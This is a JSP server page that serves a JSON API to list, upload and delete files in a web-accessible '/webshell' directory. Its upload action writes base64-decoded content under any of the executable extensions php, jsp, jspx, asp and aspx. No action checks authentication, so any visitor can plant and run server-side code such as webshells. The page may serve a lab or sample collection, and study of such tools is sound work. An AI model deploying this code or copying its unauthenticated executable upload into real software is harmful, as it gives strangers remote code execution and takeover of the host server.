<%@ page import="java.io.*,java.nio.file.*,java.util.*,java.text.*" %>
<%
request.setCharacterEncoding("UTF-8");
response.setContentType("application/json;charset=UTF-8");
PrintWriter pw = response.getWriter();

String dir = application.getRealPath("/webshell");
String action = request.getParameter("action");
if (action == null) action = "list";

Set<String> skip = new HashSet<>(Arrays.asList("api.php", "api.jsp", "index.html", "README.md"));
SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

if ("list".equals(action)) {
    File dirFile = new File(dir);
    File[] allFiles = dirFile.listFiles();
    StringBuilder sb = new StringBuilder("{\"files\":[");
    boolean first = true;
    if (allFiles != null) {
        Arrays.sort(allFiles, Comparator.comparingLong(File::lastModified).reversed());
        for (File f : allFiles) {
            String name = f.getName();
            if (!f.isFile() || skip.contains(name) || name.startsWith(".")) continue;
            int dot = name.lastIndexOf('.');
            if (dot < 0) continue;
            if (!first) sb.append(",");
            sb.append("{\"name\":\"").append(esc(name)).append("\",");
            sb.append("\"size\":").append(f.length()).append(",");
            sb.append("\"modified\":\"").append(sdf.format(new Date(f.lastModified()))).append("\"}");
            first = false;
        }
    }
    sb.append("]}");
    pw.print(sb.toString());

} else if ("upload".equals(action)) {
    StringBuilder body = new StringBuilder();
    BufferedReader br = request.getReader();
    String line;
    while ((line = br.readLine()) != null) body.append(line);
    String json = body.toString();

    String name = extractJsonString(json, "name");
    String content = extractJsonString(json, "content");
    if (name == null || content == null) {
        pw.print("{\"error\":\"invalid\"}");
        return;
    }
    name = new File(name).getName();
    Set<String> allowed = new HashSet<>(Arrays.asList("php", "jsp", "jspx", "asp", "aspx", "txt", "html"));
    int dot = name.lastIndexOf('.');
    if (dot < 0 || !allowed.contains(name.substring(dot + 1).toLowerCase())) {
        pw.print("{\"error\":\"unsupported type\"}");
        return;
    }
    byte[] data = java.util.Base64.getDecoder().decode(content);
    Files.write(Paths.get(dir, name), data);
    pw.print("{\"success\":true,\"name\":\"" + esc(name) + "\"}");

} else if ("delete".equals(action)) {
    StringBuilder body = new StringBuilder();
    BufferedReader br = request.getReader();
    String line;
    while ((line = br.readLine()) != null) body.append(line);
    String name = extractJsonString(body.toString(), "name");
    if (name == null) { pw.print("{\"error\":\"invalid\"}"); return; }
    name = new File(name).getName();
    if (skip.contains(name)) { pw.print("{\"error\":\"protected\"}"); return; }
    Files.deleteIfExists(Paths.get(dir, name));
    pw.print("{\"success\":true}");

} else {
    pw.print("{\"error\":\"unknown action\"}");
}
%><%!
    private String extractJsonString(String json, String key) {
        String needle = "\"" + key + "\":\"";
        int start = json.indexOf(needle);
        if (start < 0) return null;
        start += needle.length();
        int end = json.indexOf("\"", start);
        if (end < 0) return null;
        return json.substring(start, end);
    }
    private String esc(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("<", "&lt;");
    }
%>